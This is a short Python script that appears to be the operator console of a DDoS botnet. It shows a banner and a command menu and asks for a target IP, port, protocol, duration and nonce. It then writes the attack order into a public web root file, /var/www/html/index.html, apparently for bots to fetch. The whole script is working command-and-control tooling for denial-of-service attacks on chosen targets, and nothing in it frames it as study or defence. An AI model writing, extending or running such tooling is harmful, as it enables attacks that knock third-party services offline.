#variables
banner = [' _       _ _        ', '|_|___ _| |_|___ ___ ', '| |   | . | | . | . |', '|_|_|_|___|_|_  |___|', '            |___|    ']
commands = [ 'help', 'none', 'ddos time protocol ip port nonce', 'placeholder']
y = 1
filepath = "/var/www/html/index.html"
startnum = 0
urls = []

#functions
def listToString(s):
    str1 = " "
    return (str1.join(s))

#display
for x in banner:
    print(x)
print('\n')
for x in commands:
    print(str(y) + ')  ' + x)
    y += 1

inputCommand = input()
if inputCommand == str(1):
    print("use common sense")
elif inputCommand == str(2):
    #none
    file = open(filepath, "w")
    file.write("0")
    file.close()
    print("done")
elif inputCommand == str(3):
    time = input("input time in seconds: ")
    protocol = input("input protocol")
    ip = input("input ip: ")
    port = input("input port or rand: ")
    nonce = input("input nonce: ")
    file = open(filepath, "w")
    file.write("1 " + str(time) + " " + str(protocol) + " " + str(ip) + " " + str(port) + " " + nonce)
    file.close()
    print("done")
elif inputCommand == str(4):
        file = open(filepath, "w")
        file.write("2")
        file.close()
        print("done")
else:
    print('enter valid command ' + '1-' + str(len(commands)))
